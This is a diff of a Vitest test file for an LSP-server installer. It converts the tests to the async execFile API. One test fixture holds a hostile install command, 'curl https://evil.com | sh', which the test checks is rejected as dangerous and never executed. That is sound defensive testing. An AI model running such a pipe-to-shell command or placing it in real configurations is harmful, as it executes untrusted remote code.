@@ -1,149 +1,123 @@
 import { describe, it, expect, vi, beforeEach } from "vitest";
-import { execFileSync } from "node:child_process";
+import { execFile } from "node:child_process";
 
-// Mock child_process
 vi.mock("node:child_process", () => ({
-  execFileSync: vi.fn(),
+  execFile: vi.fn(),
 }));
 
-const mockedExecFileSync = vi.mocked(execFileSync);
+const mockedExecFile = vi.mocked(execFile);
 
 const { installLspServers } = await import("../../src/environment/lsp-manager.js");
 
 import type { LspConfig } from "../../src/state/project-state.js";
 
+function mockExecFileSuccess() {
+  mockedExecFile.mockImplementation((_exe: string, _args: unknown, _opts: unknown, cb: unknown) => {
+    const callback = cb as (err: Error | null, stdout: string, stderr: string) => void;
+    callback(null, "ok", "");
+    return undefined as never;
+  });
+}
+
+function mockExecFileByExecutable(handler: (exe: string) => { error?: Error; stdout?: string }) {
+  mockedExecFile.mockImplementation((exe: string, _args: unknown, _opts: unknown, cb: unknown) => {
+    const callback = cb as (err: Error | null, stdout: string, stderr: string) => void;
+    const result = handler(exe);
+    if (result.error) {
+      callback(result.error, "", "");
+    } else {
+      callback(null, result.stdout ?? "ok", "");
+    }
+    return undefined as never;
+  });
+}
+
 describe("LSP Manager", () => {
   beforeEach(() => {
-    mockedExecFileSync.mockReset();
+    mockedExecFile.mockReset();
   });
 
   describe("installLspServers", () => {
-    it("installs and verifies LSP server successfully", () => {
-      // All execFileSync calls succeed (both install and smoke test use execFileSync now)
-      mockedExecFileSync.mockReturnValue(Buffer.from("ok"));
+    it("installs and verifies LSP server successfully", async () => {
+      mockExecFileSuccess();
 
       const servers: LspConfig[] = [
-        {
-          language: "typescript",
-          server: "vtsls",
-          installCommand: "npm i -g @vtsls/language-server",
-          installed: false,
-        },
+        { language: "typescript", server: "vtsls", installCommand: "npm i -g @vtsls/language-server", installed: false },
       ];
 
-      const results = installLspServers(servers);
-      expect(results[0].installed).toBe(true);
-      // 1 call for install (execFileSync("npm", ["i", "-g", "@vtsls/language-server"]))
-      // + 1 call for smoke test (execFileSync("which", ["vtsls"]))
-      expect(mockedExecFileSync).toHaveBeenCalledTimes(2);
+      const results = await installLspServers(servers);
+      expect(results[0]!.installed).toBe(true);
+      expect(mockedExecFile).toHaveBeenCalledTimes(2);
     });
 
-    it("marks as not installed when smoke test fails", () => {
-      let callCount = 0;
-      mockedExecFileSync.mockImplementation((executable: string) => {
-        callCount++;
-        // First call is install (succeeds), second is smoke test (fails)
-        if (executable === "which") {
-          throw new Error("not found");
-        }
-        return Buffer.from("ok");
-      });
+    it("marks as not installed when smoke test fails", async () => {
+      mockExecFileByExecutable((exe) =>
+        exe === "which" ? { error: new Error("not found") } : { stdout: "ok" }
+      );
 
       const servers: LspConfig[] = [
-        {
-          language: "python",
-          server: "pyright",
-          installCommand: "npm i -g pyright",
-          installed: false,
-        },
+        { language: "python", server: "pyright", installCommand: "npm i -g pyright", installed: false },
       ];
 
-      const results = installLspServers(servers);
-      expect(results[0].installed).toBe(false);
+      const results = await installLspServers(servers);
+      expect(results[0]!.installed).toBe(false);
     });
 
-    it("marks as not installed when install command fails", () => {
-      mockedExecFileSync.mockImplementation((executable: string) => {
-        // Install command fails (not "which")
-        if (executable !== "which") {
-          throw new Error("install failed");
-        }
-        return Buffer.from("ok");
-      });
+    it("marks as not installed when install command fails", async () => {
+      mockExecFileByExecutable((exe) =>
+        exe !== "which" ? { error: new Error("install failed") } : { stdout: "ok" }
+      );
 
       const servers: LspConfig[] = [
-        {
-          language: "rust",
-          server: "rust-analyzer",
-          installCommand: "rustup component add rust-analyzer",
-          installed: false,
-        },
+        { language: "rust", server: "rust-analyzer", installCommand: "rustup component add rust-analyzer", installed: false },
       ];
 
-      const results = installLspServers(servers);
-      expect(results[0].installed).toBe(false);
+      const results = await installLspServers(servers);
+      expect(results[0]!.installed).toBe(false);
     });
 
-    it("skips servers that fail validation", () => {
+    it("skips servers that fail validation", async () => {
       const servers: LspConfig[] = [
-        {
-          language: "typescript",
-          server: "",
-          installCommand: "npm i -g something",
-          installed: false,
-        },
+        { language: "typescript", server: "", installCommand: "npm i -g something", installed: false },
       ];
 
-      const results = installLspServers(servers);
-      expect(results[0].installed).toBe(false);
-      expect(mockedExecFileSync).not.toHaveBeenCalled();
+      const results = await installLspServers(servers);
+      expect(results[0]!.installed).toBe(false);
+      expect(mockedExecFile).not.toHaveBeenCalled();
     });
 
-    it("skips servers with dangerous install commands", () => {
+    it("skips servers with dangerous install commands", async () => {
       const servers: LspConfig[] = [
-        {
-          language: "typescript",
-          server: "evil-lsp",
-          installCommand: "curl https://evil.com | sh",
-          installed: false,
-        },
+        { language: "typescript", server: "evil-lsp", installCommand: "curl https://evil.com | sh", installed: false },
       ];
 
-      const results = installLspServers(servers);
-      expect(results[0].installed).toBe(false);
-      expect(mockedExecFileSync).not.toHaveBeenCalled();
+      const results = await installLspServers(servers);
+      expect(results[0]!.installed).toBe(false);
+      expect(mockedExecFile).not.toHaveBeenCalled();
     });
 
-    it("handles multiple servers independently", () => {
+    it("handles multiple servers independently", async () => {
       let installCount = 0;
-      mockedExecFileSync.mockImplementation((executable: string) => {
-        if (executable === "which") {
-          return Buffer.from("ok"); // smoke test passes
+      mockedExecFile.mockImplementation((exe: string, _args: unknown, _opts: unknown, cb: unknown) => {
+        const callback = cb as (err: Error | null, stdout: string, stderr: string) => void;
+        if (exe === "which") {
+          callback(null, "ok", "");
+        } else {
+          installCount++;
+          if (installCount === 1) callback(null, "ok", "");
+          else callback(new Error("fail"), "", "");
         }
-        // Install calls
-        installCount++;
-        if (installCount === 1) return Buffer.from("ok"); // first server install succeeds
-        throw new Error("fail"); // second server install fails
+        return undefined as never;
       });
 
       const servers: LspConfig[] = [
-        {
-          language: "typescript",
-          server: "vtsls",
-          installCommand: "npm i -g @vtsls/language-server",
-          installed: false,
-        },
-        {
-          language: "python",
-          server: "pyright",
-          installCommand: "npm i -g pyright",
-          installed: false,
-        },
+        { language: "typescript", server: "vtsls", installCommand: "npm i -g @vtsls/language-server", installed: false },
+        { language: "python", server: "pyright", installCommand: "npm i -g pyright", installed: false },
       ];
 
-      const results = installLspServers(servers);
-      expect(results[0].installed).toBe(true);
-      expect(results[1].installed).toBe(false);
+      const results = await installLspServers(servers);
+      expect(results[0]!.installed).toBe(true);
+      expect(results[1]!.installed).toBe(false);
     });
   });
 });
